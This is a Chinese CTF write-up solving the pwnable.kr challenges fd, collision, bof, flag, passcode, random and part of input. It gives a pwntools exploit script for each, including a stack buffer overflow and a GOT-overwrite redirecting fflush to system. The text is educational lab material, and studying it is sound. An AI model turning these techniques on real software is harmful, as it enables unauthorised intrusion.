<p>&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;argc&#x8BB0;&#x5F55;&#x4E86;&#x8F93;&#x5165;&#x53C2;&#x6570;&#x7684;&#x4E2A;&#x6570;&#x3002;</p>
<p>&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x6570;&#x7EC4;&#x7684;&#xFF0C;&#x5B57;&#x7B26;&#x4E32;&#x6570;&#x7EC4;&#x7684;&#x6BCF;&#x4E2A;&#x5355;&#x5143;&#x662F;char*&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x6307;&#x5411;&#x4E00;&#x4E2A;c&#x98CE;&#x683C;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;arg[ ]&#x6307;&#x5411;&#x7684;&#x6570;&#x7EC4;&#x4E2D;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x6307;&#x9488;&#xFF0C;&#x5373;arg[0].&#x4ED6;&#x901A;&#x5E38;&#x6307;&#x5411;&#x7A0B;&#x5E8F;&#x4E2D;&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
<p>&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x7528;&#x6765;&#x53D6;&#x5F97;&#x7CFB;&#x7EDF;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x5982;&#xFF1A;&#x5728;DOS&#x4E0B;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;PATH&#x53D8;&#x91CF;&#x3002;&#x5F53;&#x4F60;&#x5728;DOS&#x63D0;&#x793A;&#x7B26;&#x4E0B;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x65F6;&#x5019;&#xFF0C;DOS&#x4F1A;&#x9996;&#x5148;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x627E;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5219;&#x5230;PATH&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x5F84;&#x4E0B;&#x53BB;&#x627E;&#xFF0C;&#x627E;&#x5230;&#x5219;&#x6267;&#x884C;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x8FD4;&#x56DE;Bad command or file name &#x3002;&#x5728;DOS&#x547D;&#x4EE4;&#x63D0;&#x793A;&#x7B26;&#x4E0B;&#x952E;&#x5165;set&#x53EF;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;</p>
</blockquote>
<p><strong>&#x5173;&#x4E8E;&#x53C2;&#x6570;fd</strong>
fd &#x662F;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x53E5;&#x67C4;,&#x5B83;&#x4EE3;&#x8868;&#x7684;&#x662F;&#x4F60;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;,
&gt;</p>
<blockquote>
<p>stdin &#x6807;&#x51C6;&#x8F93;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#x7B26;&#x4E3A;0</p>
<p>stdout &#x6807;&#x51C6;&#x8F93;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#x7B26;&#x4E3A;1</p>
<p>stderr &#x6807;&#x51C6;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#x7B26;&#x4E3A;2</p>
</blockquote>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x8BA9;fd&#x4E3A;0&#x6307;&#x5411;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x6D41; &#x518D;&#x8F93;&#x5165;&#x201C;LETMEWIN\n&#x201D;&#x5C31;&#x884C;&#x4E86;</p>
<h3 id="exp"><a name="exp" class="anchor-navigation-ex-anchor" href="#exp"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

payload=str(<span class="hljs-number">0x1234</span>)

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;fd&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)
<span class="hljs-comment">#shell.download_file(&apos;fd.c&apos;)</span>
sh = shell.run(<span class="hljs-string">&apos;./fd&apos;</span>+<span class="hljs-string">&apos; &apos;</span>+payload)
payload=<span class="hljs-string">&quot;LETMEWIN&quot;</span>
sh.sendline(payload)
sh.interactive()
</code></pre>
<h2 id="0x02-collision"><a name="0x02-collision" class="anchor-navigation-ex-anchor" href="#0x02-collision"><i class="fa fa-link" aria-hidden="true"></i></a>0x02 collision</h2>
<p>&#x4E0B;&#x8F7D;&#x5F97;&#x5230;&#x6838;&#x5FC3;&#x6E90;&#x7801;</p>
<pre><code class="lang-cpp"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> hashcode = <span class="hljs-number">0x21DD09EC</span>;
<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">check_password</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* p)</span></span>{
    <span class="hljs-keyword">int</span>* ip = (<span class="hljs-keyword">int</span>*)p;<span class="hljs-comment">//&#x628A;&#x5B57;&#x7B26;&#x6307;&#x9488;&#x5F3A;&#x8F6C;&#x4E3A;int&#x6307;&#x9488; char(1&#x5B57;&#x8282;*4)-&gt;int(4&#x5B57;&#x8282;)</span>
    <span class="hljs-keyword">int</span> i;
    <span class="hljs-keyword">int</span> res=<span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++){
        res += ip[i];
    }
    <span class="hljs-keyword">return</span> res;
}
</code></pre>
<p>&#x600E;&#x4E48;&#x6784;&#x9020;p&#x5462;&#xFF0C;&#x7C97;&#x66B4;&#x5E73;&#x5747;&#x5206;&#x3002;&#x3002;&#x3002;&#x3002;&#x9664;5&#x6709;&#x5C0F;&#x6570;&#x5C31;&#x8C03;&#x6574;&#x4E00;&#x4E0B;</p>
<pre><code>&gt;&gt;&gt;hex(int(0x21DD09EC+1)/5)
&apos;0x6c5cec9&apos;
</code></pre><p>&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x6784;&#x9020;exp</p>
<h3 id="exp_1"><a name="exp_1" class="anchor-navigation-ex-anchor" href="#exp_1"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

payload=p32(<span class="hljs-number">0x6c5cec9</span>)*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x6c5cec8</span>)

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;col&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)
<span class="hljs-comment">#shell.download_file(&apos;col.c&apos;)</span>
sh = shell.run(<span class="hljs-string">&apos;./col&apos;</span>+<span class="hljs-string">&apos; &apos;</span>+payload)
sh.interactive()
</code></pre>
<h2 id="0x03-bof"><a name="0x03-bof" class="anchor-navigation-ex-anchor" href="#0x03-bof"><i class="fa fa-link" aria-hidden="true"></i></a>0x03 bof</h2>
<p>&#x6700;&#x7ECF;&#x5178;&#x7684;gets&#x6EA2;&#x51FA;&#x8986;&#x76D6;</p>
<p>&#x5728;ida &#x91CC;&#x770B;&#x53C2;&#x6570;a1&#x548C;buf&#x7684;&#x5DEE;&#x8DDD;&#xFF0C;&#x6EA2;&#x51FA;&#x8986;&#x76D6;&#x5C31;&#x884C;&#x4E86;</p>
<pre><code>#coding=utf-8
from pwn import *

io=remote(&quot;pwnable.kr&quot;,9000)
payload=&apos;a&apos;*(0x2c+0x8)+p32(0xcafebabe)
io.sendline(payload)
io.interactive()
</code></pre><h2 id="0x04-flag"><a name="0x04-flag" class="anchor-navigation-ex-anchor" href="#0x04-flag"><i class="fa fa-link" aria-hidden="true"></i></a>0x04 flag</h2>
<p>&#x76F4;&#x63A5;&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#x7528;ida pro&#x5206;&#x6790;&#x53D1;&#x73B0;&#x53EA;&#x6709;&#x4E09;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x6709;&#x4E00;&#x5927;&#x5806;shellcode&#x5728;&#x91CC;&#x9762;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x540E;&#x6765;&#x610F;&#x8BC6;&#x5230;&#x53EF;&#x80FD;&#x52A0;&#x4E86;&#x58F3;&#xFF0C;&#x7528;</p>
<pre><code>upx -d flag
</code></pre><p>&#x8131;&#x58F3;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;ida pro&#x9006;&#x5411;&#x4E86;</p>
<p>&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x91CC;&#x9762;&#x627E;&#x5230;flag</p>
<h2 id="0x05-passcode"><a name="0x05-passcode" class="anchor-navigation-ex-anchor" href="#0x05-passcode"><i class="fa fa-link" aria-hidden="true"></i></a>0x05 passcode</h2>
<p>&#x653E;&#x5230;ida&#x91CC;&#x5206;&#x6790;</p>
<pre><code class="lang-cpp">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span>
  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>

  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode1 : &quot;</span>);
  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>);
  fflush(<span class="hljs-built_in">stdin</span>);
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode2 : &quot;</span>);
  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;checking...&quot;</span>);
  <span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">338150</span> || v2 != <span class="hljs-number">13371337</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
  }
</code></pre>
<p>&#x53EA;&#x8981;&#x8BA9;</p>
<pre><code>v1 == 338150 &amp;&amp; v2 == 13371337
</code></pre><p>&#x4E00;&#x5F00;&#x59CB;&#x4EE5;&#x4E3A;welcome()&#x548C;login()&#x6808;&#x4E0A;&#x4E3A;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;weclome&#x91CC;&#x7684;name&#x8FDB;&#x884C;&#x8986;&#x76D6;passcode1,passcode2</p>
<pre><code>void welcome(){
    char name[100];
    printf(&quot;enter you name : &quot;);
    scanf(&quot;%100s&quot;, name);
    printf(&quot;Welcome %s!\n&quot;, name);
}
</code></pre><p><del>&#x4F46;&#x4E8B;&#x5B9E;&#x4E0A;&#x7531;&#x4E8E;passcode1&#x4E3A;338150&#xFF08;0x000582E6&#xFF09;&#xFF0C;passcode2&#x4E3A;13371337&#xFF08;0x00cc07c9&#xFF09;&#xFF0C;&#x53C8;&#x662F;&#x7528;scanf %s,&#x5B58;&#x5728;00&#x622A;&#x65AD;,&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x8986;&#x76D6;&#x3002;&#x3002;&#x3002;</del></p>
<blockquote>
<p>&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x53D1;&#x73B0; %100s &#x662F;&#x4F1A;&#x8BFB;100&#x4E2A;&#x5B57;&#x8282;&#xFF08;&#x5305;&#x62EC;&#x96F6;&#x5B57;&#x8282;&#xFF09; </p>
</blockquote>
<p>&#x518D;&#x770B;&#x770B;&#x6808;&#x5E03;&#x5C40;</p>
<pre><code class="lang-cpp"><span class="hljs-comment">//welcome()  </span>
<span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-70h]</span>
<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch] //&#x8FD9;&#x91CC;&#x7684;v2&#x662F;Canary</span>
<span class="hljs-comment">//login()</span>
<span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span>
<span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>
</code></pre>
<p>&#x56E0;&#x4E3A;&#x4E24;&#x6B21;ebp&#x4E0D;&#x53D8;&#xFF0C;&#x6240;&#x4EE5;&#x662F;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x80FD;&#x8986;&#x76D6;&#x5230;passcode1&#xFF0C;&#x4E5F;&#x5C31;&#x662F;v1,v2&#x7531;&#x4E8E;Canary&#x7684;&#x5F00;&#x542F;&#x65E0;&#x6CD5;&#x88AB;&#x8986;&#x76D6;&#x3002;&#x3002;&#x3002;</p>
<p>&#x90A3;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF0C;</p>
<p>&#x6CE8;&#x610F;&#x5230;checksec&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#x662F;&#x6CA1;&#x6709;&#x5F00;PIE&#xFF08;&#x5730;&#x5740;&#x65E0;&#x5173;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#xFF09;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BD5;&#x7740;Hijack GOT</p>
<blockquote>
<p>GOT &#x8868;&#x7684;&#x521D;&#x59CB;&#x503C;&#x90FD;&#x6307;&#x5411; PLT &#x8868;&#x5BF9;&#x5E94;&#x6761;&#x76EE;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x7247;&#x6BB5;&#xFF0C;&#x8FD9;&#x4E2A;&#x7247;&#x6BB5;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x5730;&#x5740;&#x89E3;&#x6790;&#x51FD;&#x6570;&#x3002;&#x5F53;&#x7A0B;&#x5E8F;&#x9700;&#x8981;&#x8C03;&#x7528;&#x67D0;&#x4E2A;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x5230; PLT &#x8868;&#x5185;&#x5BFB;&#x627E;&#x5BF9;&#x5E94;&#x7684;&#x5165;&#x53E3;&#x70B9;&#xFF0C;&#x8DF3;&#x8F6C;&#x5230; GOT &#x8868;&#x4E2D;&#x3002;&#x5982;&#x679C;&#x8FD9;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x901A;&#x8FC7; GOT &#x8868;&#x518D;&#x6B21;&#x8DF3;&#x8F6C;&#x56DE; PLT &#x8868;&#xFF0C;&#x8FD0;&#x884C;&#x5730;&#x5740;&#x89E3;&#x6790;&#x7A0B;&#x5E8F;&#x6765;&#x786E;&#x5B9A;&#x51FD;&#x6570;&#x7684;&#x786E;&#x5207;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x7528;&#x5176;&#x8986;&#x76D6;&#x6389; GOT &#x8868;&#x7684;&#x521D;&#x59CB;&#x503C;&#xFF0C;&#x4E4B;&#x540E;&#x518D;&#x6267;&#x884C;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x3002;&#x5F53;&#x518D;&#x6B21;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4ECD;&#x7136;&#x9996;&#x5148;&#x901A;&#x8FC7; PLT &#x8868;&#x8DF3;&#x8F6C;&#x5230; GOT &#x8868;&#xFF0C;&#x6B64;&#x65F6; GOT &#x8868;&#x5DF2;&#x7ECF;&#x5B58;&#x6709;&#x83B7;&#x53D6;&#x51FD;&#x6570;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x76F4;&#x63A5;&#x8DF3;&#x8F6C;&#x5230;&#x51FD;&#x6570;&#x6240;&#x5728;&#x5730;&#x5740;&#x6267;&#x884C;&#x51FD;&#x6570;&#x3002;</p>
<p>&#x5982;&#x4F55;&#x786E;&#x5B9A;&#x51FD;&#x6570; A &#x5728; GOT &#x8868;&#x4E2D;&#x7684;&#x6761;&#x76EE;&#x4F4D;&#x7F6E;&#xFF1F;</p>
<p>&#x7A0B;&#x5E8F;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x65F6;&#x662F;&#x901A;&#x8FC7; PLT &#x8868;&#x8DF3;&#x8F6C;&#x5230; GOT &#x8868;&#x7684;&#x5BF9;&#x5E94;&#x6761;&#x76EE;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5728;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x7684;&#x6C47;&#x7F16;&#x6307;&#x4EE4;&#x4E2D;&#x627E;&#x5230; PLT &#x8868;&#x4E2D;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x5165;&#x53E3;&#x70B9;&#x4F4D;&#x7F6E;&#xFF0C;&#x4ECE;&#x800C;&#x5B9A;&#x4F4D;&#x5230;&#x8BE5;&#x51FD;&#x6570;&#x5728; GOT &#x4E2D;&#x7684;&#x6761;&#x76EE;&#x3002;</p>
<p>&#x6458;&#x81EA;&#x300A;&#x624B;&#x628A;&#x624B;&#x6559;&#x4F60;&#x6808;&#x6EA2;&#x51FA;&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x653E;&#x5F03;&#xFF08;&#x4E0B;)&#x300B;<a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank">https://zhuanlan.zhihu.com/p/25892385</a></p>
</blockquote>
<p>&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;scanf&#x6765;&#x4FEE;&#x6539;&#x6B64;&#x540E;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;got&#x8868;&#x9879;&#x3002;</p>
<pre><code class="lang-assembly">.text:080485E3                 mov     dword ptr [esp], offset command ; &quot;/bin/cat flag&quot;
.text:080485EA                 call    _system
</code></pre>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x628A;&#x5730;&#x5740;&#x4FEE;&#x6539;&#x5230;&#x4FEE;&#x6539;&#x5230;0x080485E3&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
<p>&#x6BD4;&#x5982;&#x4E0A;&#x9762;&#x7A0B;&#x5E8F;&#x5728;</p>
<pre><code class="lang-c"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode1);
</code></pre>
<p>&#x540E;&#x7ACB;&#x5373;&#x4F7F;&#x7528;&#x4E86;fflush&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x627E;&#x5230;fflush&#x7684;got&#x8868;&#x9879;&#x5730;&#x5740;&#xFF0C;</p>
<p>&#x628A;&#x8986;&#x76D6;passcode1&#x4E3A;&#x8BE5;&#x5730;&#x5740;</p>
<p>&#x5E76;&#x5728;&#x8C03;&#x7528;&#x5230;scanf(&#x201C;%d&#x201D;, passcode1)</p>
<p>&#x65F6;&#x8F93;&#x5165;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x4E2D;&#x8C03;&#x7528;system(&quot;/bin/cat flag&quot;);&#x5904;&#x7684;&#x5730;&#x5740;(&#x53EF;&#x5728;ida&#x4E2D;&#x627E;&#x5230;)&#x5373;&#x53EF;&#x3002;</p>
<p>&#x7136;&#x540E;&#x7A0B;&#x5E8F;&#x5728;&#x6267;&#x884C;fflush&#x51FD;&#x6570;&#x65F6;&#x5C31;&#x4F1A;&#x6267;&#x884C;system(&quot;/bin/cat flag&quot;);</p>
<p>Exp:</p>
<pre><code>#coding=utf-8
from pwn import *

elf = ELF(&quot;./passcode&quot;)

fflush_got = elf.got[&quot;fflush&quot;]
#print(hex(fflush_got))
sysh_addr=0x080485E3

shell=ssh(host=&apos;pwnable.kr&apos;,user=&apos;passcode&apos;,password=&apos;guest&apos;,port=2222)
#shell.download_file(&quot;./passcode.c&quot;)
#shell.download_file(&quot;./passcode&quot;)


payload=&quot;a&quot;*(100-4)+p32(fflush_got)
sh=shell.run(&apos;./passcode&apos;)
sh.sendlineafter(&quot;enter you name :&quot;,payload)
payload=str(sysh_addr)
sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)
sh.interactive()
</code></pre><h2 id="0x06-random"><a name="0x06-random" class="anchor-navigation-ex-anchor" href="#0x06-random"><i class="fa fa-link" aria-hidden="true"></i></a>0x06 random</h2>
<p>&#x5173;&#x952E;&#x6E90;&#x7801;</p>
<pre><code class="lang-cpp">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> random;
    random = rand();    <span class="hljs-comment">// random value!</span>

    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key=<span class="hljs-number">0</span>;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;key);

    <span class="hljs-keyword">if</span>( (key ^ random) == <span class="hljs-number">0xdeadbeef</span> ){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good!\n&quot;</span>);
        system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
</code></pre>
<p>&#x6211;&#x4EEC;&#x77E5;&#x9053;rand()&#x662F;&#x4E00;&#x4E2A;&#x6839;&#x636E;srand(seed)&#x751F;&#x6210;&#x7684;&#x4F2A;&#x968F;&#x673A;&#x6570;&#x5217;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x91CC;&#x7684;seed&#x53C8;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF08;&#x672A;&#x8C03;&#x7528;srand()&#xFF09;</p>
<p>&#x5C31;&#x53EF;&#x4EE5;&#x5199;Exp&#x4E86;</p>
<p>Exp:</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
context(arch = <span class="hljs-string">&apos;amd64&apos;</span>, os = <span class="hljs-string">&apos;linux&apos;</span>)

libc=cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;random&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)
<span class="hljs-comment">#shell.download_file(&quot;./random.c&quot;)</span>
<span class="hljs-comment">#shell.download_file(&quot;./random&quot;)</span>

payload=str(<span class="hljs-number">0xdeadbeef</span>^(libc.rand()))

sh=shell.run(<span class="hljs-string">&apos;./random&apos;</span>)
sh.sendline(payload)
sh.interactive()
</code></pre>
<h2 id="0x07-input"><a name="0x07-input" class="anchor-navigation-ex-anchor" href="#0x07-input"><i class="fa fa-link" aria-hidden="true"></i></a>0x07 input</h2>
<p>&#x8003;&#x5BDF;&#x7A0B;&#x5E8F;&#x7684;&#x5404;&#x9879;&#x57FA;&#x672C;&#x64CD;&#x4F5C;</p>
<p>&#x53EF;&#x60DC;&#x6211;&#x8FD8;&#x6CA1;&#x6709;&#x90A3;&#x4E48;&#x591A;&#x201C;&#x5E38;&#x8BC6;&#x201D;</p>
<h3 id="stage-1-argv"><a name="stage-1-argv" class="anchor-navigation-ex-anchor" href="#stage-1-argv"><i class="fa fa-link" aria-hidden="true"></i></a>Stage 1 argv</h3>
<pre><code class="lang-c">    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">100</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-string">&apos;A&apos;</span>],<span class="hljs-string">&quot;\x00&quot;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-string">&apos;B&apos;</span>],<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stage 1 clear!\n&quot;</span>);
</code></pre>
<p>&#x4E00;&#x5F00;&#x59CB;&#x76F4;&#x63A5;&#x5199;</p>
<pre><code>#payload=&quot; a&quot;*(ord(&apos;A&apos;)-1)+&quot; \x00&quot;+&quot; a&quot;*(ord(&apos;B&apos;)-ord(&apos;A&apos;))+&quot; \x20\x0a\x0d&quot;+&apos; a&apos;*(100-ord(&apos;B&apos;)+1)
#sh=shell.run(&apos;./input&apos;+payload)
</code></pre><p>&#x53D1;&#x73B0;\x20\x0a\x0d&#x662F;&#x7A7A;&#x683C;&#x6362;&#x884C;&#x56DE;&#x8F66;&#x3002;&#x3002;&#x3002;&#x3002;&#x4F1A;&#x88AB;&#x5F53;&#x6210;&#x5206;&#x9694;&#x7B26;&#x4E0D;&#x88AB;&#x8BFB;&#x5165;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x624B;&#x52A8;&#x8BBE;&#x7F6E;&#x5206;&#x9694;&#x7B26;&#x7684;&#x65B9;&#x5F0F;&#x901A;&#x8FC7;Stage1</p>
<pre><code>IFS=&apos;-&apos;//&#x8BBE;&#x7F6E;&#x5206;&#x9694;&#x7B26;&#x4E3A;&#x201C;-&#x201D;
./input `python-c &apos;print&quot;aaa-&quot;*64+&quot;\x00-&quot;+&quot;\x20\x0a\x0d-&quot;+&quot;aaa-&quot;*33&apos;`
</code></pre><p>&#x6700;&#x540E;&#x8FD8;&#x662F;&#x53D1;&#x73B0;&#x5199;c&#x811A;&#x672C;&#x66F4;&#x597D;&#x7528;</p>
<p><strong>Exp</strong></p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">101</span>]={<span class="hljs-string">&quot;./input&quot;</span>,
                     [<span class="hljs-number">1</span> ... <span class="hljs-number">99</span>]=<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-comment">/*C11 lambda&#x8868;&#x8FBE;&#x5F0F;*/</span>
                     <span class="hljs-literal">NULL</span>},
         *envp[<span class="hljs-number">2</span>];
    argv[<span class="hljs-string">&apos;A&apos;</span>]=<span class="hljs-string">&quot;\x00&quot;</span>;
    argv[<span class="hljs-string">&apos;B&apos;</span>]=<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>;

    execve(<span class="hljs-string">&quot;./input&quot;</span>,argv,envp);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 id="stage-2-stdio"><a name="stage-2-stdio" class="anchor-navigation-ex-anchor" href="#stage-2-stdio"><i class="fa fa-link" aria-hidden="true"></i></a>Stage 2 stdio</h3>
<pre><code class="lang-c">  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];
  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);
  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buf, <span class="hljs-string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="hljs-number">4</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  read(<span class="hljs-number">2</span>, buf, <span class="hljs-number">4</span>);
  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buf, <span class="hljs-string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="hljs-number">4</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stage 2 clear!\n&quot;</span>);
</code></pre>
